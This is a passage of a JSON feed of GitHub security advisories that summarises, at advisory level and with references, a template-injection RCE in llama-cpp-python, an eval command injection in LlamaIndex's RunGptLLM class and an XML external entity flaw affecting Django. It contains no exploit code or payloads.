href=\"https://github.com/advisories/GHSA-56xg-wfcc-g829\">https://github.com/advisories/GHSA-56xg-wfcc-g829</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56xg-wfcc-g829",
            "title": "[llama-cpp-python] llama-cpp-python vulnerable to Remote Code Execution by Server-Side Template Injection in Model Metadata",
            "date_modified": "2024-05-28T17:58:37.000Z",
            "date_published": "2024-05-13T14:10:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56xg-wfcc-g829"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A command injection vulnerability exists in the RunGptLLM class of the llama_index library, version 0.9.47, used by the RunGpt framework from JinaAI to connect to Language Learning Models (LLMs). The vulnerability arises from the improper use of the eval function, allowing a malicious or compromised LLM hosting provider to execute arbitrary commands on the client's machine. This issue was fixed in version 0.10.13. The exploitation of this vulnerability could lead to a hosting provider gaining full control over client machines.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4181\">https://nvd.nist.gov/vuln/detail/CVE-2024-4181</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba\">https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba</a></li>\n<li><a href=\"https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1\">https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw38-xv9x-h8ch\">https://github.com/advisories/GHSA-pw38-xv9x-h8ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch",
            "title": "[llama-index-llms-rungpt] RunGptLLM class in LlamaIndex has a command injection",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2024-05-16T09:33:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A command injection vulnerability exists in the RunGptLLM class of the llama_index library, version 0.9.47, used by the RunGpt framework from JinaAI to connect to Language Learning Models (LLMs). The vulnerability arises from the improper use of the eval function, allowing a malicious or compromised LLM hosting provider to execute arbitrary commands on the client's machine. This issue was fixed in version 0.10.13. The exploitation of this vulnerability could lead to a hosting provider gaining full control over client machines.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4181\">https://nvd.nist.gov/vuln/detail/CVE-2024-4181</a></li>\n<li><a href=\"https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba\">https://github.com/run-llama/llama_index/commit/d73715eaf0642705583e7897c78b9c8dd2d3a7ba</a></li>\n<li><a href=\"https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1\">https://huntr.com/bounties/1a204520-598a-434e-b13d-0d34f2a5ddc1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw38-xv9x-h8ch\">https://github.com/advisories/GHSA-pw38-xv9x-h8ch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch",
            "title": "[llama-index] RunGptLLM class in LlamaIndex has a command injection",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2024-05-16T09:33:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw38-xv9x-h8ch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The XML libraries for Python as used in OpenStack Keystone Essex and Folsom, Django, and possibly other products allow remote attackers to read arbitrary files via an XML external entity declaration in conjunction with an entity reference, aka an XML External Entity (XXE) attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-1665\">https://nvd.nist.gov/vuln/detail/CVE-2013-1665</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1100279\">https://bugs.launchpad.net/keystone/+bug/1100279</a></li>\n<li><a href=\"http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html\">http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html</a></li>\n<li><a href=\"http://bugs.python.org/issue17239\">http://bugs.python.org/issue17239</a></li>\n<li><a href=\"http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html\">http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0657.html\">http://rhn.redhat.com/errata/RHSA-2013-0657.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0658.html\">http://rhn.redhat.com/errata/RHSA-2013-0658.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0670.html\">http://rhn.redhat.com/errata/RHSA-2013-0670.html</a></li>\n<li><a href=\"http://ubuntu.com/usn/usn-1757-1\">http://ubuntu.com/usn/usn-1757-1</a></li>\n<li><a href=\"http://www.debian.org/security/2013/dsa-2634\">http://www.debian.org/security/2013/dsa-2634</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/2\">http://www.openwall.com/lists/oss-security/2013/02/19/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/4\">http://www.openwall.com/lists/oss-security/2013/02/19/4</a></li>\n<li><a href=\"https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40\">https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40</a></li>\n<li><a href=\"https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112\">https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x64m-686f-fmm3\">https://github.com/advisories/GHSA-x64m-686f-fmm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3",
            "title": "[Django] XML External Entity (XXE) in Django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2022-05-17T05:09:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The XML libraries for Python as used in OpenStack Keystone Essex and Folsom, Django, and possibly other products allow remote attackers to read arbitrary files via an XML external entity declaration in conjunction with an entity reference, aka an XML External Entity (XXE) attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2013-1665\">https://nvd.nist.gov/vuln/detail/CVE-2013-1665</a></li>\n<li><a href=\"https://bugs.launchpad.net/keystone/+bug/1100279\">https://bugs.launchpad.net/keystone/+bug/1100279</a></li>\n<li><a href=\"http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html\">http://blog.python.org/2013/02/announcing-defusedxml-fixes-for-xml.html</a></li>\n<li><a href=\"http://bugs.python.org/issue17239\">http://bugs.python.org/issue17239</a></li>\n<li><a href=\"http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html\">http://lists.openstack.org/pipermail/openstack-announce/2013-February/000078.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0657.html\">http://rhn.redhat.com/errata/RHSA-2013-0657.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0658.html\">http://rhn.redhat.com/errata/RHSA-2013-0658.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0670.html\">http://rhn.redhat.com/errata/RHSA-2013-0670.html</a></li>\n<li><a href=\"http://ubuntu.com/usn/usn-1757-1\">http://ubuntu.com/usn/usn-1757-1</a></li>\n<li><a href=\"http://www.debian.org/security/2013/dsa-2634\">http://www.debian.org/security/2013/dsa-2634</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/2\">http://www.openwall.com/lists/oss-security/2013/02/19/2</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2013/02/19/4\">http://www.openwall.com/lists/oss-security/2013/02/19/4</a></li>\n<li><a href=\"https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40\">https://github.com/django/django/commit/1c60d07ba23e0350351c278ad28d0bd5aa410b40</a></li>\n<li><a href=\"https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112\">https://github.com/django/django/commit/d19a27066b2247102e65412aa66917aff0091112</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x64m-686f-fmm3\">https://github.com/advisories/GHSA-x64m-686f-fmm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3",
            "title": "[Django] XML External Entity (XXE) in Django",
            "date_modified": "2024-05-24T19:21:22.000Z",
            "date_published": "2022-05-17T05:09:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x64m-686f-fmm3"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}